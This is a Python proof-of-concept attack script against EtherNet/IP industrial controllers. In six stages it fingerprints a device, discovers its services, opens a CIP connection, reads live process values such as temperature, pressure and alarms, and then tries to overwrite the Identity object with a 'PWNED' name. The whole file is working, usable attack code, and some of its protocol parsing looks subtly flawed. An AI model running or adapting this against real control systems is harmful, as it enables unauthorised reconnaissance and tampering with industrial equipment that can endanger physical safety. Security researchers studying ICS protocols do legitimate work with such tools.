"""
EtherNet/IP Advanced Attack PoC — Multi-Stage Reconnaissance and Exploitation

Stages:
  1. ListIdentity — fingerprint device (vendor, product, serial, revision, state)
  2. ListServices — discover supported communication services
  3. RegisterSession + ForwardOpen — establish Class 1 I/O connection
  4. Read Assembly instance data — parse structured I/O values
  5. SetAttributeSingle on Identity object — attempt firmware modification path
  6. ForwardClose + UnregisterSession — clean teardown

Usage: python advanced_attack.py host [port]
"""
import socket
import struct
import time
import sys
import argparse
import textwrap
from typing import Optional, Tuple, Dict, Any, List


ENCAP = struct.Struct("<HHIQII")

EIP_CMD = {
    0x63: "ListIdentity",
    0x64: "ListServices",
    0x65: "RegisterSession",
    0x66: "UnregisterSession",
    0x6F: "SendRRData",
    0x70: "SendUnitData",
}

CIP_SVC = {
    0x0E: "GetAttributeSingle",
    0x10: "SetAttributeSingle",
    0x01: "GetAttributeAll",
    0x02: "SetAttributeAll",
    0x4E: "ForwardOpen",
    0x4F: "ForwardClose",
    0x52: "Reset",
    0x54: "Stop",
}

IDENTITY_ITEM = {
    0x0001: "Product Name",
    0x0002: "Device Type",
    0x0003: "Product Code",
    0x0004: "Revision",
    0x0005: "Status",
    0x0006: "Serial Number",
    0x0007: "Product Name (string)",
    0x0008: "State",
    0x0009: "Configuration Consistency",
    0x000A: "Heartbeat Interval",
    0x000B: "Reserved",
    0x000C: "Reserved",
}

DEFAULT_PORT = 44818
TIMEOUT = 5


def phex(data: bytes) -> str:
    return data.hex(" ") if data else "(empty)"


def indent(text: str, prefix: str = "    ") -> str:
    return textwrap.indent(text, prefix)


class EIPClient:
    def __init__(self, host: str, port: int = DEFAULT_PORT):
        self.host = host
        self.port = port
        self.sock: Optional[socket.socket] = None
        self.session_id: int = 0
        self.conn_o_t_id: int = 0
        self.conn_t_o_id: int = 0
        self.ctx_counter: int = 0

    def _ctx(self) -> int:
        self.ctx_counter += 1
        return self.ctx_counter

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(TIMEOUT)
        self.sock.connect((self.host, self.port))
        print(f"[*] Connected to {self.host}:{self.port}")

    def disconnect(self):
        if self.sock:
            self.sock.close()
            self.sock = None
        print("[*] Disconnected")

    def _encap(self, cmd: int, sess: int = 0, ctx: int = 0,
               data: bytes = b"", status: int = 0) -> bytes:
        h = ENCAP.pack(cmd, 24 + len(data), sess & 0xFFFFFFFF, ctx, status, 0)
        return h + data

    def _send_raw(self, data: bytes) -> bytes:
        if not self.sock:
            raise ConnectionError("Not connected")
        self.sock.sendall(data)
        response = b""
        while True:
            try:
                chunk = self.sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if len(response) >= 24:
                    _, length = struct.unpack("<HH", response[:4])
                    if length > 0 and len(response) >= length:
                        break
            except socket.timeout:
                break
        return response

    def _send_encap(self, cmd: int, data: bytes = b"") -> Tuple[int, int, bytes]:
        ctx = self._ctx()
        packet = self._encap(cmd, self.session_id, ctx, data)
        resp = self._send_raw(packet)
        if len(resp) < 24:
            raise ValueError(f"Response too short: {len(resp)} bytes")
        encap_cmd, length, handle, ctx, status, options = ENCAP.unpack(resp[:24])
        payload = resp[24:length] if length > 24 else b""
        return encap_cmd, status, payload

    def _build_cip_path(self, class_id: int, instance_id: int = 1,
                        attribute_id: int = 0) -> bytes:
        path = bytearray()
        path += bytes([0x20, class_id & 0xFF])
        path += bytes([0x24, instance_id & 0xFF])
        if attribute_id:
            path += bytes([0x30, attribute_id & 0xFF])
        return bytes(path)

    def _parse_identity_response(self, data: bytes) -> Dict[int, Any]:
        if len(data) < 22:
            return {"_error": f"Identity data too short: {len(data)} bytes"}
        ipaddr = struct.unpack("<H", data[:2])[0]
        version = struct.unpack("<H", data[2:4])[0]
        port = struct.unpack("<H", data[4:6])[0]
        vendor = struct.unpack("<H", data[6:8])[0]
        hostname_len = data[8]
        hostname_buf = data[9:9 + hostname_len]
        hostname = hostname_buf.decode("ascii", errors="replace").strip("\x00")
        result = {
            "protocol_version": version,
            "port": port,
            "vendor_id": vendor,
            "hostname": hostname,
            "items": {},
            "item_list_version": 0,
        }
        items_start = 9 + hostname_len
        if items_start + 5 < len(data):
            item_count = struct.unpack("<H", data[items_start:items_start + 2])[0]
            result["item_list_version"] = struct.unpack(
                "<H", data[items_start + 2:items_start + 4])[0]
            item_data = data[items_start + 4:]
            parsed = self._parse_identity_items(item_data, item_count)
            result["items"] = parsed
        return result

    def _parse_identity_items(self, data: bytes, count: int) -> Dict[int, Any]:
        items = {}
        offset = 0
        for _ in range(count):
            if offset + 4 > len(data):
                break
            item_type = struct.unpack("<H", data[offset:offset + 2])[0]
            item_len = struct.unpack("<H", data[offset + 2:offset + 4])[0]
            offset += 4
            if offset + item_len > len(data):
                break
            item_value = data[offset:offset + item_len]
            items[item_type] = self._decode_item(item_type, item_value)
            offset += item_len
        return items

    def _decode_item(self, item_type: int, value: bytes) -> Any:
        if item_type == 0x0001:
            return value.decode("ascii", errors="replace").strip("\x00")
        elif item_type == 0x0002:
            return struct.unpack("<H", value)[0] if len(value) >= 2 else value
        elif item_type == 0x0003:
            return struct.unpack("<H", value)[0] if len(value) >= 2 else value
        elif item_type == 0x0004:
            if len(value) >= 4:
                return (struct.unpack("<H", value[:2])[0],
                        struct.unpack("<H", value[2:4])[0])
            return value
        elif item_type == 0x0005:
            return struct.unpack("<H", value)[0] if len(value) >= 2 else value
        elif item_type == 0x0006:
            return struct.unpack("<I", value)[0] if len(value) >= 4 else value
        elif item_type == 0x0007:
            len_val = struct.unpack("<H", value[:2])[0] if len(value) >= 2 else 0
            return value[2:2 + len_val].decode("ascii", errors="replace").strip("\x00")
        elif item_type == 0x0008:
            return value.hex(" ")
        else:
            return phex(value)

    def _analyze_assembly(self, data: bytes, max_len: int = 100) -> Dict[str, Any]:
        """Parse structured assembly data with known field layout."""
        result = {"raw_size": len(data), "parsed": {}}
        if len(data) >= 2:
            result["parsed"]["status_word"] = f"0x{struct.unpack('<H', data[:2])[0]:04X}"
            result["parsed"]["status_meaning"] = (
                "RUNNING" if struct.unpack("<H", data[:2])[0] & 0x0001 else "IDLE")
        if len(data) >= 4:
            result["parsed"]["counter"] = struct.unpack("<H", data[2:4])[0]
        if len(data) >= 8:
            result["parsed"]["scaled_value"] = struct.unpack("<I", data[4:8])[0]
        if len(data) >= 12:
            result["parsed"]["temperature"] = round(
                struct.unpack("<f", data[8:12])[0], 2)
        if len(data) >= 16:
            result["parsed"]["pressure"] = round(
                struct.unpack("<f", data[12:16])[0], 2)
        if len(data) >= 18:
            result["parsed"]["alarm_flags"] = f"0x{struct.unpack('<H', data[16:18])[0]:04X}"
        if len(data) >= 22:
            result["parsed"]["timestamp_ms"] = struct.unpack("<I", data[18:22])[0]
            result["parsed"]["timestamp_human"] = time.strftime(
                "%Y-%m-%d %H:%M:%S",
                time.localtime(result["parsed"]["timestamp_ms"] / 1000))
        if len(data) >= 24:
            result["parsed"]["heartbeat"] = struct.unpack("<H", data[22:24])[0]
        return result


def stage1_fingerprint(client: EIPClient):
    """Stage 1: ListIdentity to fingerprint the device."""
    print("\n" + "=" * 62)
    print(" STAGE 1: ListIdentity — Device Fingerprinting")
    print("=" * 62)
    try:
        _, status, data = client._send_encap(0x0063)
        if status != 0:
            print(f"[!] ListIdentity returned status {status}")
            return False
        id_info = client._parse_identity_response(data)
        print(f"  Protocol Version : {id_info.get('protocol_version', '?')}")
        print(f"  Hostname          : {id_info.get('hostname', '?')}")
        vendor = id_info.get("vendor_id", 0)
        print(f"  Vendor ID         : 0x{vendor:04X} ({vendor})")
        items = id_info.get("items", {})
        for item_type in sorted(items):
            name = IDENTITY_ITEM.get(item_type, f"Item 0x{item_type:04X}")
            value = items[item_type]
            if item_type == 0x0004 and isinstance(value, tuple):
                value = f"major={value[0]}, minor={value[1]}"
            elif item_type == 0x0006:
                value = f"0x{value:08X}"
            elif item_type == 0x0002:
                name_map = {0x000E: "Programmable Logic Controller",
                           0x000C: "Communications Adapter",
                           0x002B: "AC Drive", 0x0007: "General Purpose Discrete I/O"}
                value = f"0x{value:04X} ({name_map.get(value, 'Unknown')})"
            elif item_type == 0x0005:
                status_bits = []
                if value & 0x0001:
                    status_bits.append("Owned")
                if value & 0x0002:
                    status_bits.append("Reserved2")
                if value & 0x0004:
                    status_bits.append("Configured")
                if value & 0x0008:
                    status_bits.append("Reserved8")
                if value & 0x0010:
                    status_bits.append("MinorRecoverableFault")
                if value & 0x0020:
                    status_bits.append("MinorUnrecoverableFault")
                if value & 0x0040:
                    status_bits.append("MajorRecoverableFault")
                if value & 0x0080:
                    status_bits.append("MajorUnrecoverableFault")
                status_str = " | ".join(status_bits) or "None"
                value = f"0x{value:04X} ({status_str})"
            print(f"  {name:<20}: {value}")
        return True
    except Exception as e:
        print(f"[!] Stage 1 failed: {e}")
        return False


def stage2_discover_services(client: EIPClient):
    """Stage 2: ListServices to discover supported services."""
    print("\n" + "=" * 62)
    print(" STAGE 2: ListServices — Service Discovery")
    print("=" * 62)
    try:
        _, status, data = client._send_encap(0x0064)
        if status != 0:
            print(f"[!] ListServices returned status {status}")
            return False
        if len(data) < 4:
            print(f"[!] ListServices data too short ({len(data)} bytes)")
            return False
        num_services = struct.unpack("<H", data[:2])[0]
        print(f"  Services available: {num_services}")
        offset = 2
        services_found = []
        for i in range(min(num_services, 50)):
            if offset + 4 > len(data):
                break
            svc_code = struct.unpack("<H", data[offset:offset + 2])[0]
            svc_version = struct.unpack("<H", data[offset + 2:offset + 4])[0]
            services_found.append((svc_code, svc_version))
            offset += 4
        svc_names = {0x0100: "CIP", 0x0101: "CIP Web", 0x0102: "CIP Security",
                     0x0103: "CIP Safety", 0x0104: "CIP Motion",
                     0x0200: "Modbus", 0x0201: "SNMP", 0x0202: "HTTP",
                     0x0203: "FTP", 0x0204: "DCOM"}
        for svc_code, svc_ver in services_found:
            sname = svc_names.get(svc_code, f"Service 0x{svc_code:04X}")
            print(f"    0x{svc_code:04X} v{svc_ver}  — {sname}")
        remaining = data[offset:]
        if remaining:
            print(f"  Additional data: {phex(remaining[:40])}")
        return True
    except Exception as e:
        print(f"[!] Stage 2 failed: {e}")
        return False


def stage3_register_and_open(client: EIPClient):
    """Stage 3: RegisterSession and ForwardOpen a Class 1 connection."""
    print("\n" + "=" * 62)
    print(" STAGE 3: RegisterSession + ForwardOpen")
    print("=" * 62)
    try:
        _, status, data = client._send_encap(0x0065)
        if status != 0:
            print(f"[!] RegisterSession returned status {status}")
            return False
        if len(data) < 8:
            print("[!] RegisterSession response too short")
            return False
        client.session_id = struct.unpack("<Q", data[:8])[0]
        print(f"  Session registered: 0x{client.session_id:016X}")

        path = client._build_cip_path(0x06, 1)
        priority = 0x0A
        timeout_ticks = 0x50
        conn_parameters = struct.pack("<H", 0x4200)
        conn_parameters += struct.pack("<H", 8)
        conn_parameters += struct.pack("<H", 0x0FA3)
        conn_parameters += struct.pack("<B", 0x03)
        conn_parameters += struct.pack("<B", 0x01)
        o_t_conn_params = struct.pack("<I", 0x00000000)
        o_t_conn_params += struct.pack("<I", 500000)
        o_t_conn_params += struct.pack("<H", 100)
        o_t_conn_params += struct.pack("<H", 12)
        o_t_conn_params += struct.pack("<H", 0x4432)
        o_t_conn_params += struct.pack("<H", 0x0000)
        o_t_conn_params += struct.pack("<I", 0x00000000)
        o_t_conn_params += struct.pack("<H", 0x0000)
        o_t_conn_params += struct.pack("<B", 0x00)
        o_t_conn_params += struct.pack("<B", 0x00)
        o_t_conn_params += struct.pack("<B", 0x00)
        o_t_conn_params += struct.pack("<B", 0x02)
        t_o_conn_params = struct.pack("<I", 0x00000000)
        t_o_conn_params += struct.pack("<I", 500000)
        t_o_conn_params += struct.pack("<H", 8)
        t_o_conn_params += struct.pack("<H", 12)
        t_o_conn_params += struct.pack("<H", 0x4432)
        t_o_conn_params += struct.pack("<H", 0x0000)
        t_o_conn_params += struct.pack("<I", 0x00000000)
        t_o_conn_params += struct.pack("<H", 0x0000)
        t_o_conn_params += struct.pack("<B", 0x00)
        t_o_conn_params += struct.pack("<B", 0x00)
        t_o_conn_params += struct.pack("<B", 0x00)
        t_o_conn_params += struct.pack("<B", 0x02)
        ekey_data = struct.pack("<HHHHH", 0x0001, 0x000E, 0x0064, 4, 1)
        transport_data = struct.pack("<B", 0x02)
        transport_data += struct.pack("<B", 0x01)
        server_port_data = struct.pack("<HHHH", 0x0000, 0x0000, 0x0000, 0x0000)
        transport_data += server_port_data

        path_len = len(path) // 2

        cip_request_full = struct.pack("<BB", 0x4E, path_len) + path
        cip_request_full += struct.pack("<B", priority)
        cip_request_full += struct.pack("<B", timeout_ticks)
        cip_request_full += conn_parameters
        cip_request_full += o_t_conn_params
        cip_request_full += t_o_conn_params
        cip_request_full += transport_data
        cip_request_full += ekey_data

        ctx = client._ctx()
        full_packet = struct.pack("<I", 0x00000000)
        full_packet += struct.pack("<Q", 0x0000000000000000)
        full_packet += struct.pack("<H", 0x0000)
        full_packet += cip_request_full

        encap_header = client._encap(0x006F, client.session_id, ctx,
                                     data=full_packet)
        response = client._send_raw(encap_header)

        if len(response) < 24:
            print("[!] ForwardOpen response too short")
            return False

        _, _, _, _, status, _ = ENCAP.unpack(response[:24])
        cip_resp = response[32:] if len(response) > 32 else response[24:]

        if len(cip_resp) >= 10:
            resp_svc = cip_resp[0]
            if resp_svc & 0x80:
                resp_status = cip_resp[2] if len(cip_resp) > 2 else 0
            else:
                resp_status = 0xFF

        if resp_status == 0:
            if len(cip_resp) >= 10:
                client.conn_o_t_id = struct.unpack("<I", cip_resp[2:6])[0]
                client.conn_t_o_id = struct.unpack("<I", cip_resp[6:10])[0]
            print(f"  ForwardOpen success!")
            print(f"  O->T Connection ID: 0x{client.conn_o_t_id:08X}")
            print(f"  T->O Connection ID: 0x{client.conn_t_o_id:08X}")
            if len(cip_resp) >= 34:
                o_t_rpi = struct.unpack("<I", cip_resp[18:22])[0]
                t_o_rpi = struct.unpack("<I", cip_resp[22:26])[0]
                o_t_size = struct.unpack("<H", cip_resp[10:12])[0]
                t_o_size = struct.unpack("<H", cip_resp[12:14])[0]
                print(f"  O->T RPI: {o_t_rpi}us Size: {o_t_size}")
                print(f"  T->O RPI: {t_o_rpi}us Size: {t_o_size}")
            return True
        else:
            print(f"[!] ForwardOpen failed with general status 0x{resp_status:02X}")
            return False
    except Exception as e:
        print(f"[!] Stage 3 failed: {e}")
        return False


def stage4_read_assembly(client: EIPClient):
    """Stage 4: Read assembly instance data via GetAttributeSingle."""
    print("\n" + "=" * 62)
    print(" STAGE 4: Read Assembly Data")
    print("=" * 62)
    try:
        inst_num = 1
        result_all = b""

        for attr_id in (3, 4):
            path = client._build_cip_path(0x04, inst_num, attr_id)
            cip_req = struct.pack("<BB", 0x0E, len(path) // 2) + path
            encap_data = struct.pack("<Q", 0x0000000000000000) + \
                         struct.pack("<H", 0x0000) + cip_req
            ctx = client._ctx()
            packet = client._encap(0x006F, client.session_id, ctx,
                                   data=encap_data)
            response = client._send_raw(packet)

            attr_name = "INPUT" if attr_id == 3 else "OUTPUT"
            if len(response) >= 32:
                cip = response[32:]
                if cip[0] & 0x80:
                    gen_status = cip[2] if len(cip) > 2 else 0
                    attr_data = cip[3:] if len(cip) > 3 else b""
                    print(f"  Assembly {attr_name} (attr {attr_id}): "
                          f"{len(attr_data)} bytes read, status=0x{gen_status:02X}")
                    if attr_id == 3:
                        result_all = attr_data
                        parsed = client._analyze_assembly(attr_data)
                        print(f"  [*] Parsed I/O values:")
                        for field, value in sorted(parsed.get("parsed", {}).items()):
                            print(f"      {field:<20}: {value}")
                else:
                    print(f"  Assembly {attr_name} (attr {attr_id}): error response "
                          f"(service bit not set)")
            else:
                print(f"  Assembly {attr_name} (attr {attr_id}): response too short")

        return True
    except Exception as e:
        print(f"[!] Stage 4 failed: {e}")
        return False


def stage5_write_identity(client: EIPClient):
    """Stage 5: Try SetAttributeSingle on Identity object."""
    print("\n" + "=" * 62)
    print(" STAGE 5: SetAttributeSingle on Identity (Exploit Attempt)")
    print("=" * 62)
    try:
        inst_num = 1
        attr_id = 7
        malicious_name = b"PWNED-Device-v6.6.6\x00"
        path = client._build_cip_path(0x01, inst_num, attr_id)
        cip_req = struct.pack("<BB", 0x10, len(path) // 2) + path + \
                  malicious_name
        encap_data = struct.pack("<Q", 0x0000000000000000) + \
                     struct.pack("<H", 0x0000) + cip_req
        ctx = client._ctx()
        packet = client._encap(0x006F, client.session_id, ctx,
                               data=encap_data)
        response = client._send_raw(packet)

        if len(response) >= 32:
            cip = response[32:]
            if cip[0] & 0x80:
                gen_status = cip[2] if len(cip) > 2 else 0
                if gen_status == 0x00:
                    print(f"  [!!!] SUCCESS: Identity name modified!")
                    print(f"  [!!!] Device now exposes: {malicious_name.decode()}")
                else:
                    status_name = {
                        0x0E: "Attribute not settable",
                        0x0F: "Privilege violation",
                        0x14: "Attribute not supported",
                    }.get(gen_status, f"0x{gen_status:02X}")
                    print(f"  SetAttributeSingle on Identity returned "
                          f"status 0x{gen_status:02X} ({status_name})")
                    if gen_status == 0x0F:
                        print("  [*] Device enforces privilege checks (partially hardened)")
            else:
                print("  Response malformed — service bit not set")
        else:
            print(f"  Response too short ({len(response)} bytes)")
        return True
    except Exception as e:
        print(f"[!] Stage 5 failed: {e}")
        return False


def stage6_cleanup(client: EIPClient):
    """Stage 6: ForwardClose and UnregisterSession."""
    print("\n" + "=" * 62)
    print(" STAGE 6: Cleanup — ForwardClose + UnregisterSession")
    print("=" * 62)
    try:
        if client.conn_o_t_id:
            path = struct.pack("<BB", 0x24, 0x01)
            close_data = struct.pack("<BB", 0x4F, len(path) // 2) + path + \
                         struct.pack("<HB", 0x0001, 0x01) + \
                         struct.pack("<I", client.conn_o_t_id) + \
                         struct.pack("<I", client.conn_t_o_id)
        else:
            path = struct.pack("<BB", 0x24, 0x01)
            close_data = struct.pack("<BB", 0x4F, len(path) // 2) + path + \
                         struct.pack("<H", 0x0001) + \
                         struct.pack("<I", 0x00000000) + \
                         struct.pack("<I", 0x00000000)

        encap_data = struct.pack("<Q", 0x0000000000000000) + \
                     struct.pack("<H", 0x0000) + close_data
        ctx = client._ctx()
        packet = client._encap(0x006F, client.session_id, ctx,
                               data=encap_data)
        response = client._send_raw(packet)

        if len(response) >= 32:
            cip = response[32:]
            if cip[0] & 0x80:
                print(f"  ForwardClose: accepted")
            else:
                print(f"  ForwardClose: rejected")
        else:
            print(f"  ForwardClose: sent (no confirmation)")

        _, status, _ = client._send_encap(0x0066)
        if status == 0:
            print(f"  Session unregistered")
        else:
            print(f"  UnregisterSession returned status {status}")
        return True
    except Exception as e:
        print(f"[!] Stage 6 failed: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="EtherNet/IP Advanced Attack PoC — "
                    "Multi-Stage Reconnaissance and Exploitation"
    )
    parser.add_argument("host", help="Target EtherNet/IP device IP or hostname")
    parser.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT,
                        help=f"Target port (default: {DEFAULT_PORT})")
    parser.add_argument("--stages", type=str, default="1,2,3,4,5,6",
                        help="Comma-separated stages to run (default: 1,2,3,4,5,6)")
    args = parser.parse_args()

    stages = [int(s) for s in args.stages.split(",") if s.strip().isdigit()]
    if not stages:
        stages = [1, 2, 3, 4, 5, 6]

    print("=" * 62)
    print(" EtherNet/IP Advanced Attack PoC")
    print(" Target: %s:%d" % (args.host, args.port))
    print(" Stages: %s" % ",".join(str(s) for s in stages))
    print("=" * 62)

    client = EIPClient(args.host, args.port)
    client.connect()

    results = {}
    stage_funcs = {
        1: ("ListIdentity Fingerprinting", stage1_fingerprint),
        2: ("ListServices Discovery", stage2_discover_services),
        3: ("RegisterSession + ForwardOpen", stage3_register_and_open),
        4: ("Read Assembly Data", stage4_read_assembly),
        5: ("SetAttributeSingle on Identity", stage5_write_identity),
        6: ("ForwardClose + UnregisterSession", stage6_cleanup),
    }

    for stage_num in stages:
        if stage_num not in stage_funcs:
            print(f"\n[!] Unknown stage {stage_num}, skipping")
            continue
        name, func = stage_funcs[stage_num]
        print(f"\n>>> Running Stage {stage_num}: {name}")
        try:
            results[stage_num] = func(client)
        except Exception as e:
            print(f"[!] Stage {stage_num} crashed: {e}")
            results[stage_num] = False

    print("\n" + "=" * 62)
    print(" RESULTS SUMMARY")
    print("=" * 62)
    for stage_num in stages:
        if stage_num in results:
            status = "SUCCESS" if results[stage_num] else "FAILED"
            print(f"  Stage {stage_num}: {status}")
    print("=" * 62)

    client.disconnect()


if __name__ == "__main__":
    main()
